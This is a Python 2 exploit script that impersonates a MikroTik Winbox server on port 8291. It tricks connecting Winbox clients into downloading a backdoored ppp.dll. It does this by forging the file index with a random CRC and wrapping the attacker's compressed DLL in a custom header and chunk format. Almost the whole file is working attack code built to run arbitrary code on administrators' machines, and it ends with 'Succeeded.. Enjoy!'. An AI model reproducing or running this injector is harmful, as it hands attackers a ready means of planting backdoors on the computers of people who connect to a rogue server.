#!/usr/bin/python

import socket,sys,os,struct,random

global fPointer

def SendFile(conn, filename):
	f = open(filename, 'rb')
	global fPointer
	f.seek(fPointer)
	fData = f.read(66049)
	fPointer += 66049
	f.close()
	data = conn.send(fData)


random.seed()
print "\n+-----------------------------------+"
print "|                                   |\\"
print "| Winbox remote client DLL injector | |"
print "|                                   | |"
print "+___________________________________+ |"
print " \___________________________________\|"

randByte = str(random.randint(100,999))		# i need 3 random digits for a random crc
filename = raw_input("\nEnter the compressed filename: ")
fileRequest = 'ppp.dll'		# this will be the file in the index, that the client will request
							# and we'll send the backdoored dll instead of the original one.

try:	# Open the compressed file (gzip format) in order to send it later..
	f = open(filename, 'rb')
	buff = f.read()
	f.close()
except:
	print "[-] Error opening file"
	sys.exit(0)

# This number is very critical for the other structures
compressedFileSize = os.path.getsize(filename)
if compressedFileSize < 10000 or compressedFileSize > 99000:
	print "[-] Error. Compressed filesize must be between 10k-99k! Read comments or visit 133tsec.com for details"
	sys.exit(0)

# Make the index include the size of the custom dll file... overwrite the ppp.dll size
# ( That's why we need 7 chars filelength and 5 chars filesize.. got it? :D ok am a bit lazy... ;p )
f = open('index514.dat', 'rb')
myIndex = f.read()
f.close()
myIndex = myIndex[0:0x9F] + str(compressedFileSize) + myIndex[0xA4:]	# changing filesize dynamically, in hardcoded ocffsets! **** THIS IS WRONG IF THE FILESIZE IS NOT 5 DIGITS! *****
myIndex = myIndex[0:0x9B] + randByte+" " + myIndex[0x9F:]		# changing crc to a random one so am sure every time client is downloading my backdoor again.

WinboxHeader = 	("\xFF\x02" +							# WORD: hardcoded
				#"\x70\x70\x70\x2E\x64\x6C\x6C" +		# VARIABLE-SIZED: filename (printable chars) MAX:11 chars
				fileRequest +			# **** THIS IS WRONG IF THE FILENAME LENGTH IS NOT 7 CHARS! *****
				"\x00\x00\x00\x00" +					# VAR-SIZED: zero bytes till strlen(filename) + \x00*X = 11 bytes. These zeroes may not exist if strlen(filename) = 11
				"\x01" +								# BYTE: hardcoded. signals the end of zeros and beginning of the length
				struct.pack('>H',compressedFileSize) +	# WORD: length of gzip'ed file in big endian
				"\x00\x00\x00\x00")						# DWORD: hardcoded zeros before the gzip magic bytes.

print "\n\n[+] File \'"+filename+"\' opened with size "+str(compressedFileSize)+" bytes"
print "[+] Waiting connection on port 8291.."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(('', 8291))
s.listen(1)
conn, addr = s.accept()
print '[+] Connection received by', addr
print "[+] Waiting for index."
data = conn.recv(1024)
if data.find("\x12\x02"+"index"+"\x00") > -1:
	print "[+] Index received!"
else:
	print "[+] Wrong index.. Exiting.."
	sys.exit(0)
print "[+] Sending DLL Index (Step 1)"

# Step 1 : Sending the dll index list...
data = conn.send(myIndex)
data = conn.recv(1024)

global fPointer
fPointer=0

# checking if client requests the .dll we sent.. this depends to the CRC sent in Step 1
while data.find("\x12\x02") > -1:		# If a file is requested.....
	if data.find(fileRequest) > -1:		# if the file is our backdoored compressed DLL.. ;)
		print "[+] Client just requested " + fileRequest
		print "[+] Sending compressed file with custom header (Step 2)"
		#########################################################################################
		# Step 2 : Sending the gzip file raw data with the custom header						#
		#########################################################################################
		#	Constructing the custom compressed file format										#
		#########################################################################################
		#	1. The header of the gzip file must be in format: WinboxHeader						#
		#	2. The gzip contents must contain the word 0xFF 0xFF in every 257 bytes (0x101)		#
		#	3. The gzip last 0x101-chunk must contain the word 0x(size till end of file) 0xFF	#
		#########################################################################################
		# Give the spark
		customGzip = WinboxHeader
		customGzip += buff[0:0xED]
		customGzip += '\xFF\xFF'
		#Loop the most data
		for i in range(0x1EC, len(buff), 0xFF):
			customGzip += buff[i-0xFF:i]
			if 	0x101 > (len(buff)-i):		# if it's the last FF FF appended, then do it \x[(bytesToEOF)byte]\xFF
				customGzip += struct.pack('=B', len(buff)-i) + '\xFF'
			else:
				customGzip += '\xFF\xFF'
		#..and finish it
		customGzip += buff[i:len(buff)]
		data = conn.send(customGzip)
		print "[+] Compressed file sent"
		data = conn.recv(1024)
	else:			# else it's requesting another file from index..
		while (data[2:].split("\x00")[0]!=fileRequest) and data[0:2]=="\x12\x02":		# send other index's dll except the backdoored...
			fPointer=0
			print "[x] Client is requesting "+data[2:].split("\x00")[0]+" file.."
			CurrentRequest=data[2:].split("\x00")[0]
			while data[2:].split("\x00")[0]==CurrentRequest:
				SendFile(conn, CurrentRequest)
				data = conn.recv(1024)
				print hex(struct.unpack('=B', data[18:19])[0]), hex(struct.unpack('=B', data[19:20])[0])
print "Succeeded.. Enjoy!"
conn.close()

